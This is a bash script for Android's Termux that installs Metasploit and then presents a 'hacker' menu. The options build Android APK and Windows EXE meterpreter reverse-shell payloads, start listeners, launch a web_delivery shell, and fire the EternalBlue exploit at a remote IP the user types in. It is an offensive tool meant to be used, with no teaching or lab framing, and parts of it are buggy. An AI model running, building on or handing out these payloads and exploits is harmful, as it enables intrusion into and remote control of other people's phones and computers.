#!/data/data/com.termux/files/usr/bin/bash
#script walid (easy installl metasploit-framework)
echo	'welcame to script: ' $0
yan='\e[0;36m'
lightcyan='\e[96m'
green='\e[0;32m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'
blue='\e[1;34m'
Escape="\033";
white="${Escape}[0m";
RedF="${Escape}[31m";
GreenF="${Escape}[32m";
LighGreenF="${Escape}[92m"
YellowF="${Escape}[33m";
BlueF="${Escape}[34m";
CyanF="${Escape}[36m";
Reset="${Escape}[0m";
sleep 0.15 && echo -e $green" ☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠"
sleep 0.15 && echo -e "                                            "
sleep 0.15 && echo -e "  ██╗    ██╗ █████╗ ██╗     ██╗██████╗    " 
sleep 0.15 && echo -e "  ██║    ██║██╔══██╗██║     ██║██╔══██╗  "  
sleep 0.15 && echo -e "  ██║ █╗ ██║███████║██║     ██║██║  ██║  "  
sleep 0.15 && echo -e "  ██║███╗██║██╔══██║██║     ██║██║  ██║    "
sleep 0.15 && echo -e "  ╚███╔███╔╝██║  ██║███████╗██║██████╔╝   " 
sleep 0.15 && echo -e "   ╚══╝╚══╝ ╚═╝  ╚═╝╚══════╝╚═╝╚═════╝   "  
sleep 0.15 && echo -e "        by: walid souf                                                      "
sleep 0.15 && echo -e " ☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠"
sleep 2
clear
sleep 2
sleep 0.10 && echo -e $blue "===================================+"
sleep 0.10 && echo -e "            the information              |"
sleep 0.10 && echo -e "=========================================|"
sleep 0.10 && echo -e "            Country: ALGER               |"
sleep 0.10 && echo -e "=========================================|"
sleep 0.10 && echo -e "            ELOUD SOUF                   |"
sleep 0.10 && echo -e "======================================== |"
sleep 0.10 && echo -e "       Thank you to download walid script|"                                                     
sleep 0.10 && echo -e "=========================================+"
sleep 0.10 && echo -e         "press Enter to countiuo....$Reset"
read op
echo -e $blue "install same tools please waiting.........$Reset"	
echo -e $Cyan "update packge $Reset"
clear
echo "INSTALL wget"
#pkg install wget
clear
msfvar=4.16.21
msfpath='/data/data/com.termux/files/home/test'
if [ -d "$msfpath/metasploit-framework" ]; then
	echo "metasploit is installed"
echo -e $yellow "
+-------------+-----------------+
+                               +
+        options script         +
+                               +
+-------------+-----------------+       

----------------------------
1: Geanreat payload apk
----------------------------
2: Geanreat payload windows
----------------------------
3: shell (web_delivery)
---------------------------
4: outoupown browser
--------------------------- 
5:hacker windows7 (ip)
---------------------------
6:hacker windows xp (ip)
----------------------------
7:Lunch metasploit
----------------------------
$Reset"
cd metasploit-framework
echo -e $blue " << options of script >>>"     
read -p  "choice Number:" n
case "$n" in
      "1") echo "Genreat paylaod apk"
read -p "Enter your host: "  host
sleep 1
read -p "Enter your port: " port
sleep 1
read -p "Enter the name of payload: " name
sleep 1
echo "waiting please take same time........"
msfvenom -p android/meterpreter/reverse_tcp set lhost=$host set lport=$port -o $name.apk 
echo "waiting please take same time........"
echo -e "$Yellow MOVEING PAYLOAD TO SDCARD"
echo "========================="
mv $name.apk /sdcard/
echo "the payload saved in sdcard"
read -p "satrt handler Nom" handler
touch handler.rc
echo "use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
set LPORT $port
set LHOST $host
set ExitOnSession false
exploit " > handler.rc
msfconsole -r handler.rc
rm handler.rc
      ;;
      "2") echo "Genreat paylaod windows exe ====>"
sleep 0.15 && echo -e $red " "
sleep 0.15 && echo -e "            __           __    "           
sleep 0.15 && echo -e " ___ ___ _ _| |___ ___ _| |"
sleep 0.15 && echo -e "| . | .'| | | | . | .'| . |"
sleep 0.15 && echo -e "|  _|__,|_  |_|___|__,|___|"
sleep 0.15 && echo -e "|_|     |___|              "
sleep 0.15 && echo -e "                               "
sleep 0.15 && echo -e "============================"
sleep 1
echo -e $lightcyan "                                                                                                                       
 +----------------------------------------+
 |   this moudel attcker windows with url |
 |     you can see this in metasploit     |
 |                                        |
 +----------------------------------------+
"
echo -e $green" "
sleep 2
read -p "Enter your host:>> " h
sleep 1
read -p "Enter your port:>> " p
sleep 1
read -p "Enter the name of payload:>> " n
sleep 1
echo -e $blue "waiting please take same time........"
sleep 1
msfvenom -p windows/meterpreter/reverse_tcp set LHOST=$h set LPORT=$p  -f exe > $n.exe 
echo -e "$Yellow MOVEING PAYLOAD TO SDCARD"
sleep 2
mv $n.exe /sdcard/ 
echo "<<  the payload exe saved to sdcard >>"
echo "$Purple Dane !!!"
sleep 0.15 && echo -e " "
clear
sleep 0.15 && echo -e "  __                   __ __             "
sleep 0.15 && echo -e " |  |--.---.-.-----.--|  |  .-----.----."
sleep 0.15 && echo -e " |     |  _  |     |  _  |  |  -__|   _|"
sleep 0.15 && echo -e " |__|__|___._|__|__|_____|__|_____|__|  "
                                        
sleep 1                                       
echo "Now start handler from metasploit"
echo "<=================================>"
echo -e "$Reset  ---"
touch lamine.rc
echo "use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LPORT $p
set LHOST $h
set ExitOnSession false
exploit " > lamine.rc
msfconsole -r lamine.rc
rm lamine.rc
      ;;
      "3")
sleep 0.15 && echo -e "$Yellow                "
sleep 0.15 && echo -e "              ___.     " 
sleep 0.15 && echo -e "__  _  __ ____\_ |__   "
sleep 0.15 && echo -e "\ \/ \/ // __ \| __ \  "
sleep 0.15 && echo -e " \     /\  ___/| \_\ \ "
sleep 0.15 && echo -e "  \/\_/  \___  >___  / "
sleep 0.15 && echo -e "             \/    \/ "
sleep 0.15 && echo -e "========================"
echo "$Cyan                                                                                                                        
 +-----------------------------------------+ 
 |   this moudel attcker windows with url  |
 |     you can see this in metasploit      |
 |                                         |
 |                                         |
 |                                         |
 +-----------------------------------------+

    1 - Download all website           {www.target.com}
    2 - download (user-agent decoy)    {Mozilla/5.0 X11; U; Linux i686}
    3 - Download only this file types  {.pdf .doc .jpg OR .txt,.html,.php}
  _
 | m - main menu
 |_q - exit script

 "                   
sleep 2
read -p "Enter the host: " h
read -p "Enter the port:  " p
touch help.rc
echo "
use exploit/multi/script/web_delivery
set payload windows/meterpreter/reverse_tcp
set lhost $h
set lport $p
set target 2
exploit 
" > help.rc
msfconsole -r help.rc
rm help.rc
      ;;
      "7")./msfconsole
      ;;
      "5")
echo -e $lightcyan " 
+-----------------------------------+ 
|   this moudel attcker windows     |
|                                   |
|     with (ip)                     |
|                                   |
|     Note:                         |
|                                   |      
| Windows 7 and Server 2008 R2 (x64)|
+-----------------------------------+
"
echo -e $green " _ "
read -p "Enter your ip:" m
sleep 0.1
read -p "Enter the port: " s
sleep 0.1
read -p "Enter IP Rost to ATTEkER: " at
touch ms.rc
echo "
use  exploit/windows/smb/ms17_010_eternalblue 
set lhost $m
set lport $s
set RHOST $at
set payload windows/x64/meterpreter/reverse_tcp
exploit" > m.rc
msfconsole -r m.rc
rm m.rc
      ;;
      *)  
echo -e $red "error choice $Reset"
sleep 2
exit 1



esac
clear
else
echo -e $green "update the packeg${GreenF}ok"
sleep 2
pkg update
echo -e $yellow "Dane$Reset"
echo -e $blue "instaling same packeg ... please wating...$Reset"
sleep 1
apt install -y autoconf bison clang coreutils curl findutils git apr apr-util libffi-dev libgmp-dev libpcap-dev postgresql-dev readline-dev libsqlite-dev openssl-dev libtool libxml2-dev libxslt-dev ncurses-dev pkg-config postgresql-contrib wget make ruby-dev libgrpc-dev termux-tools ncurses-utils ncurses unzip zip tar postgresql termux-elf-cleaner
clear
cd $msfpath
sleep 2
echo -e $yellow "Extracting metasploit-framework"
sleep 2
tar -xf $msfpath/$msfvar.tar.gz
mv $msfpath/metasploit-framework-$msfvar $msfpath/metasploit-framework
cd $msfpath/metasploit-framework
sed '/rbnacl/d' -i Gemfile.lock
sed '/rbnacl/d' -i metasploit-framework.gemspec
sleep 2
echo -e $yellow "This may take same time to install....."
gem install bundler
clear
isNokogiri=$(gem list nokogiri -i)
isGrpc=$(gem list grpc -i)

sed 's|nokogiri (1.*)|nokogiri (1.8.1)|g' -i Gemfile.lock

if [ $isNokogiri == "false" ];
then
      gem install nokogiri -v'1.8.1' -- --use-system-libraries
else
	echo "nokogiri already installed"
fi

cd $msfpath/metasploit-framework
bundle install -j5

echo "Gems installed"
$PREFIX/bin/find -type f -executable -exec termux-fix-shebang \{\} \;
rm ./modules/auxiliary/gather/http_pdf_authors.rb

if [ -e $PATH/bin/msfconsole ];then
	rm $PATH/bin/msfconsole
fi
if [ -e $PATH/bin/msfvenom ];then
	rm $PATH/bin/msfvenom
fi
ln -s $msfpath/metasploit-framework/msfconsole /data/data/com.termux/files/usr/bin/
ln -s $msfpath/metasploit-framework/msfvenom /data/data/com.termux/files/usr/bin/

termux-elf-cleaner /data/data/com.termux/files/usr/lib/ruby/gems/2.4.0/gems/pg-0.20.0/lib/pg_ext.so
echo "Creating database"

cd $msfpath/metasploit-framework/config
curl -LO https://Auxilus.github.io/database.yml

mkdir -p $PREFIX/var/lib/postgresql
initdb $PREFIX/var/lib/postgresql

pg_ctl -D $PREFIX/var/lib/postgresql start
createuser msf
createdb msf_database

rm $msfpath/$msfvar.tar.gz

echo "=================================finshed install=========================================" 
clear

bundle config build.nokogiri --use-system-
libraries

bundle install
bundle update nokogiri
cd ..
cd ..
bash w.sh
fi
